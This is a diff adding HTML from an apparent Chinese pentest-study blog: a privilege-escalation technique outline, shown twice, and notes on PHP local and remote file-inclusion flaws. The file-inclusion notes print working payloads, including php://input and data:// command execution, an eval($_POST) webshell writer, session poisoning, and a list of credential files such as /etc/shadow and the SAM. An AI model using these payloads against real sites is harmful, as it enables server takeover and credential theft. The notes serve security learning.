@@ -260,6 +260,1179 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/ti-quan-fang-shi-zong-jie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/ti-quan-fang-shi-zong-jie/" itemprop="url">纵观渗透测试中的提权</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T13:30:39+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要是为了总结渗透测试中我们常见的提权的思路与方式，不作详细步骤解释。</p>
+<h3 id="提权的分类"><a href="#提权的分类" class="headerlink" title="提权的分类"></a>提权的分类</h3><p>提权的分类方法和分类角度有很多，这里我们选几种角度对其进行分类</p>
+<h3 id="windows提权："><a href="#windows提权：" class="headerlink" title="windows提权："></a>windows提权：</h3><h4 id="一、本地提权"><a href="#一、本地提权" class="headerlink" title="一、本地提权"></a>一、本地提权</h4><h5 id="溢出提权："><a href="#溢出提权：" class="headerlink" title="溢出提权："></a>溢出提权：</h5><h6 id="1-远程溢出"><a href="#1-远程溢出" class="headerlink" title="1.远程溢出"></a>1.远程溢出</h6><p>​      远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。</p>
+<p>​    攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。</p>
+<h6 id="2-本地溢出"><a href="#2-本地溢出" class="headerlink" title="2.本地溢出"></a>2.本地溢出</h6><p> 本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。</p>
+<h5 id="Getpass-提权"><a href="#Getpass-提权" class="headerlink" title="Getpass 提权"></a>Getpass 提权</h5><h5 id="hash传递入侵"><a href="#hash传递入侵" class="headerlink" title="hash传递入侵"></a>hash传递入侵</h5><h5 id="lpk提权"><a href="#lpk提权" class="headerlink" title="lpk提权"></a>lpk提权</h5><h4 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h4><h5 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h5><ul>
+<li><strong>功能型：</strong>udf提权</li>
+<li><strong>技巧型：</strong>启动项提权</li>
+<li><strong>漏洞型：</strong>mof提权</li>
+</ul>
+<h5 id="2-SQL-Server提权"><a href="#2-SQL-Server提权" class="headerlink" title="2.SQL Server提权"></a>2.SQL Server提权</h5><h5 id="3-Oracle提权"><a href="#3-Oracle提权" class="headerlink" title="3.Oracle提权"></a>3.Oracle提权</h5><ul>
+<li>虚拟主机提权</li>
+<li>星外提权</li>
+<li>西部数码提权</li>
+<li>华众虚拟主机提权</li>
+</ul>
+<h4 id="三、第三方软件提权"><a href="#三、第三方软件提权" class="headerlink" title="三、第三方软件提权"></a>三、第三方软件提权</h4><h5 id="1-FTP提权"><a href="#1-FTP提权" class="headerlink" title="1.FTP提权"></a>1.FTP提权</h5><ul>
+<li>serv-u提权</li>
+<li>G6-FTP提权</li>
+<li>FileZilla提权</li>
+<li>FlashFXP提权</li>
+<li>PcAnywhere提权</li>
+<li>Xlight FTP Server提权</li>
+</ul>
+<h5 id="2-远程软件提权"><a href="#2-远程软件提权" class="headerlink" title="2.远程软件提权"></a>2.远程软件提权</h5><ul>
+<li>vnc</li>
+<li>radmin</li>
+</ul>
+<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><ul>
+<li>Magic Winmail提权</li>
+<li>navicat提权</li>
+<li>zend</li>
+<li>搜狗输入法提权</li>
+<li>PR提权详解</li>
+<li>巴西烤肉提权</li>
+<li>利用360提权</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/windows-chang-jian-ti-quan-fang-shi-zong-jie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/windows-chang-jian-ti-quan-fang-shi-zong-jie/" itemprop="url">纵观渗透测试中的提权</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T13:30:39+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要是为了总结渗透测试中我们常见的提权的思路与方式，不作详细步骤解释。</p>
+<h3 id="提权的分类"><a href="#提权的分类" class="headerlink" title="提权的分类"></a>提权的分类</h3><p>提权的分类方法和分类角度有很多，这里我们选几种角度对其进行分类</p>
+<h3 id="windows提权："><a href="#windows提权：" class="headerlink" title="windows提权："></a>windows提权：</h3><h4 id="一、本地提权"><a href="#一、本地提权" class="headerlink" title="一、本地提权"></a>一、本地提权</h4><h5 id="溢出提权："><a href="#溢出提权：" class="headerlink" title="溢出提权："></a>溢出提权：</h5><h6 id="1-远程溢出"><a href="#1-远程溢出" class="headerlink" title="1.远程溢出"></a>1.远程溢出</h6><p>​      远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。</p>
+<p>​    攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。</p>
+<h6 id="2-本地溢出"><a href="#2-本地溢出" class="headerlink" title="2.本地溢出"></a>2.本地溢出</h6><p> 本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。</p>
+<h5 id="Getpass-提权"><a href="#Getpass-提权" class="headerlink" title="Getpass 提权"></a>Getpass 提权</h5><h5 id="hash传递入侵"><a href="#hash传递入侵" class="headerlink" title="hash传递入侵"></a>hash传递入侵</h5><h5 id="lpk提权"><a href="#lpk提权" class="headerlink" title="lpk提权"></a>lpk提权</h5><h4 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h4><h5 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h5><ul>
+<li><strong>功能型：</strong>udf提权</li>
+<li><strong>技巧型：</strong>启动项提权</li>
+<li><strong>漏洞型：</strong>mof提权</li>
+</ul>
+<h5 id="2-SQL-Server提权"><a href="#2-SQL-Server提权" class="headerlink" title="2.SQL Server提权"></a>2.SQL Server提权</h5><h5 id="3-Oracle提权"><a href="#3-Oracle提权" class="headerlink" title="3.Oracle提权"></a>3.Oracle提权</h5><ul>
+<li>虚拟主机提权</li>
+<li>星外提权</li>
+<li>西部数码提权</li>
+<li>华众虚拟主机提权</li>
+</ul>
+<h4 id="三、第三方软件提权"><a href="#三、第三方软件提权" class="headerlink" title="三、第三方软件提权"></a>三、第三方软件提权</h4><h5 id="1-FTP提权"><a href="#1-FTP提权" class="headerlink" title="1.FTP提权"></a>1.FTP提权</h5><ul>
+<li>serv-u提权</li>
+<li>G6-FTP提权</li>
+<li>FileZilla提权</li>
+<li>FlashFXP提权</li>
+<li>PcAnywhere提权</li>
+<li>Xlight FTP Server提权</li>
+</ul>
+<h5 id="2-远程软件提权"><a href="#2-远程软件提权" class="headerlink" title="2.远程软件提权"></a>2.远程软件提权</h5><ul>
+<li>vnc</li>
+<li>radmin</li>
+</ul>
+<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><ul>
+<li>Magic Winmail提权</li>
+<li>navicat提权</li>
+<li>zend</li>
+<li>搜狗输入法提权</li>
+<li>PR提权详解</li>
+<li>巴西烤肉提权</li>
+<li>利用360提权</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/" itemprop="url">文件包含漏洞学习笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T12:42:02+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">web漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
+<li>require()</li>
+<li>require_once()</li>
+<li>include()</li>
+<li>include_once()</li>
+</ul>
+<p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p><img src="9272355-7889a572371b18c8.png" alt=""></p>
+<h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
+<p>示例代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
+<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = On
+allow_url_include = On，重启apache，即可生效</code></pre>
+<p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
+<pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2
+ <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre>
+<p><img src="9272355-952116d80dc7f768%5B1%5D.png" alt=""></p>
+<p><img src="9272355-e288840e08e52b5e%5B1%5D.png" alt=""></p>
+<p> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
+<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><strong>常见的敏感信息目录：</strong></p>
+<p>window系统：</p>
+<ul>
+<li>c:\boot.ini //查看系统版本</li>
+<li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li>
+<li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li>
+<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
+<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
+<li>c:\windows\php.ini // php 配置信息</li>
+</ul>
+<p>Linux系统</p>
+<ul>
+<li>/etc/passwd // 账户信息</li>
+<li>/etc/shadow // 账户密码文件</li>
+<li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li>
+<li>/etc/my.conf // mysql 配置文件</li>
+</ul>
+<h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
+<p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt=""></p>
+<p>2.或者通过猜测默认的session存放位置</p>
+<p>linux下的默认存储目录为/var/lib/php/session</p>
+<p><strong>利用过程</strong></p>
+<p>我们可以先使用文件包含上传恶意代码，比如</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span></code></pre>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
+<img src="QQ截图20200123104221.png" style="zoom:80%;" />
+
+<p>我们发现在本地session所在目录下存储了session的值</p>
+<img src="QQ截图20200123105708.png" style="zoom:80%;" />
+
+<p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
+<img src="QQ截图20200123103711.png" style="zoom:150%;" />
+
+<p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt=""></p>
+<h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
+<p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
+<p><strong>测试代码</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>当我们直接包含本地的test.txt时</p>
+<img src="QQ截图20200123113838.png" style="zoom:67%;" />
+
+<p>我们在test.txt加上%00进行截断</p>
+<img src="QQ截图20200123113851.png" style="zoom:67%;" />
+
+
+
+
+
+
+
+<p><strong>四、路径长度限制</strong></p>
+<p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
+<pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；
+linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p>
+<pre><code>&lt;?php
+   $filename =$_GET[&#39;filename&#39;];
+   include($filename . &quot;.html&quot;);
+   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<pre><code>allow_url_fopen = On（是否允许打开远程文件）
+allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p>
+<p>测试代码：</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt=""></p>
+<h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
+<p><strong>php伪协议类别</strong></p>
+<ul>
+<li>file://    访问本地文件系统</li>
+<li>http://   访问HTTP（s)网址</li>
+<li>ftp://     访问FTP(s) URLs</li>
+<li>php://      访问各个输入/输出流</li>
+<li>zlib://     压缩流</li>
+<li>data://  数据</li>
+</ul>
+<p><strong>php://filter(本地磁盘文件进行读取）</strong></p>
+<p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p>
+<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
+<p>条件：需要开启allow_url_fopen</p>
+<p>示例：</p>
+<p>本地新建file.php</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt=""></p>
+<p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt=""></p>
+<p>对得到的Base64进行解码即可。</p>
+<p><strong>file://伪协议（读取文件内容）</strong></p>
+<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<p>示例：</p>
+<img src="QQ截图20200203184038.png" style="zoom:67%;" />
+
+
+
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>用法：?file=php://input 数据利用POST传过去。</p>
+<p>利用条件：</p>
+<p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
+<pre><code>&lt;?phpinfo();?&gt;
+&lt;?php system(&#39;whoami&#39;);?&gt;
+&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p>
+<pre><code>index.php
+?file=php://input
+
+POST:
+&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>测试代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
+<span class="token delimiter">?></span></code></pre>
+<img src="QQ截图20200203182852.png" style="zoom:67%;" />
+
+<h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt=""></p>
+<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
+<p>利用条件：</p>
+<p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
+<p>示例1：</p>
+<pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="9272355-5449b681b9c47ddb%5B1%5D.png" alt=""></p>
+<p>执行命令：</p>
+<pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="9272355-0fce621191e72481%5B1%5D.png" alt=""></p>
+<p>示例2：</p>
+<pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
+<p><strong>包含session</strong></p>
+<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
+<p><img src="9272355-dd5195fec4210a53.png" alt=""></p>
+<p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
+<p><img src="9272355-1e7dd8fd1a028711%5B1%5D.png" alt=""></p>
+<p>常见的php-session存放位置还有这几个：</p>
+<pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre>
+<p>使用以下命令可查看到session文件中的登录信息</p>
+<pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre>
+<p><img src="9272355-940bb1d740bd0d47%5B1%5D.png" alt=""></p>
+<p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
